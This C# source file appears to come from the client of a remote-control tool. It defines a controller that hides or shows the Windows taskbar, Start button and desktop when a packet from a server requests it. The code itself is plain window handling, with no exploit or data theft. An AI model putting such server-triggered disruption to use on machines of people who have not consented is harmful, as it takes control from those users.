using Client.Packets.ServerPackets;
using System;
using System.Runtime.InteropServices;

namespace Client.Controllers
{
    static class HideShowController
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent,
            IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll")]
        public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

        [DllImport("user32.dll")]
        private static extern int GetDesktopWindow();

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        public static void hideDesktop()
        {
            IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
            ShowWindow(hWnd, 0);
        }
        public static void showDesktop()
        {
            IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
            ShowWindow(hWnd, 5);
        }

        static int Handle
        {
            get
            {
                return FindWindow("Shell_TrayWnd", "");
            }
        }

        static int HandleOfStartButton
        {
            get
            {
                int handleOfDesktop = GetDesktopWindow();
                int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                return handleOfStartButton;
            }
        }

        public static void showTaskbar()
        {
            ShowWindow(Handle, SW_SHOW);
            ShowWindow(HandleOfStartButton, SW_SHOW);
        }

        public static void hideTaskbar()
        {
            ShowWindow(Handle, SW_HIDE);
            ShowWindow(HandleOfStartButton, SW_HIDE);
        }

        public static void HideOrShow(HideShow packet)
        {
            if (packet.hideShow == 1)
                 hideTaskbar();
            else if (packet.hideShow == 2)
                showTaskbar();
            else if (packet.hideShow == 3)
                hideDesktop();
            else if (packet.hideShow == 4)
                showDesktop();
        }

    }
}
